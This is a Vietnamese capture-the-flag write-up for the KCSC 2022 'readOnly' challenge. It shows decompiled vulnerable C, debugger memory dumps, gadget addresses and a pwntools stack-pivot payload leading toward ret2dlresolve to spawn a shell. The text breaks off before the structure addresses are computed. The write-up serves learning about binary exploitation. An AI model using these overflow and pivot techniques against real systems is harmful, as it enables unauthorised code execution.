# Source C

```c
ssize_t vuln()
{
  char buf[48]; // [rsp+0h] [rbp-30h] BYREF

  return read(0, buf, 0x100uLL);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}
```

# Ý tưởng

- Đã tham khảo wu a Trí [link](https://github.com/nhtri2003gmail/CTFWriteup/tree/master/2022/KCSC-CTF-2022/readOnly)
- Chall này chỉ có hàm read nên hướng sẽ là ret2dlresolve, nếu địa chỉ là 0x40xxxx thì nhận luôn

- Tổng kết:

  - Stage 1: Stack pivot
  - Stage 2.1: Ret2dlresolve - Create structures
  - Stage 2.2: Ret2dlresolve - Get shell

# Khai thác

## Stack pivot

- chúng ta cần các gadget là `leave ; ret` (hoặc `pop rsp`), `pop rbp, rdi, rsp` và địa chỉ có quyền ghi được

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00000000400000 0x00000000401000 0x00000000000000 r-- /mnt/d/ctf/kcsc-2022/readOnly/readOnly
0x00000000401000 0x00000000402000 0x00000000001000 r-x /mnt/d/ctf/kcsc-2022/readOnly/readOnly
0x00000000402000 0x00000000403000 0x00000000002000 r-- /mnt/d/ctf/kcsc-2022/readOnly/readOnly
0x00000000403000 0x00000000404000 0x00000000002000 r-- /mnt/d/ctf/kcsc-2022/readOnly/readOnly
0x00000000404000 0x00000000405000 0x00000000003000 rw- /mnt/d/ctf/kcsc-2022/readOnly/readOnly
0x007f749fb41000 0x007f749fb44000 0x00000000000000 rw-

gef➤  x/50xg 0x00000000404000
0x404000:       0x0000000000403e20      0x00007f749fdb32e0
0x404010:       0x00007f749fd8dd30      0x00007f749fc2e5b0
0x404020 <read@got.plt>:        0x00007f749fc58980      0x00007f749fbc5670
0x404030:       0x0000000000000000      0x0000000000000000
0x404040 <stdout@@GLIBC_2.2.5>: 0x00007f749fd5e780      0x0000000000000000
0x404050 <stdin@@GLIBC_2.2.5>:  0x00007f749fd5daa0      0x0000000000000000
0x404060 <stderr@@GLIBC_2.2.5>: 0x00007f749fd5e6a0      0x0000000000000000
0x404070:       0x0000000000000000      0x0000000000000000
0x404080:       0x0000000000000000      0x0000000000000000
0x404090:       0x0000000000000000      0x0000000000000000
0x4040a0:       0x0000000000000000      0x0000000000000000
```

- ta lấy bao nhiêu cũng được mà nên xa xa một xíu, nên `base + 0xa00`.

```python
pop_rdi = 0x0000000000401293
pop_rsi_r15 = 0x0000000000401291
leave_ret = 0x0000000000401208
rw_section = 0x00000000404a00

payload = b'A'*(56)
payload += flat(
#     rw_section,
    pop_rsi_r15,
    rw_section,
    0,
    exe.plt['read'],
    leave_ret
    )
payload = payload.ljust(0x100, b'P')
p.send(payload)
```

- mục đích gọi lại read là để ta có thể đưa các struct vào vùng rw để thực thi

# Create structures

- đầu tiên ta sẽ chọn ra địa chỉ cho SYMTAB_addr, JMPREL_addr và STRTAB_addr (nằm trong vùng ghi được vừa tìm được ở bước 1) với điều kiện là `symbol_number`, `reloc_arg`, `st_name` là số nguyên

```
    <Address of Elf64_Sym> = <SYMTAB> + <symbol_number> * 24
<=> <symbol_number> = (<Address of Elf64_Sym> - <SYMTAB>)/24

    <Address of Elf64_Rela> = <JMPREL> + <reloc_arg> * 24
<=> <reloc_arg> = (<Address of Elf64_Rela> - <JMPREL>)/24
    <Address of Elf64_>
    st_name = STRTAB_addr - STRTAB
```

- Với các `SYSTAB, JMPREL, STRTAB` có trong file, ta sẽ tìm [ở đây]()

```
JMPREL =>   0x00000000004005b8 - 0x0000000000400600 is .rela.plt
SYSTAB =>   0x00000000004003d0 - 0x00000000004004a8 is .dynsym
STRTAB =>   0x00000000004004a8 - 0x0000000000400507 is .dynstr
dlsolve=>    0x0000000000401020 - 0x0000000000401060 is .plt
```

- và

```python
JMPREL = 0x4005b8
SYMTAB = 0x4003d0
STRTAB = 0x4004a8
dlresolve = 0x401020
```

- và tìm các addr theo điều kiện ở trên, và địa chỉ các addr phải ở trong vùng ghi được (chưa rõ có cần gần nhau không)
- tình hình là bây giờ chúng ta sẽ chọn addr, tuy nhiên base của ta chọn là `0x404a00` và payload được nhập là 0x100 kí tự nghĩa là ta sẽ chọn các số sao cho trong khoảng 0xa00 đến 0xb00
- Kết quả của a Trí tính được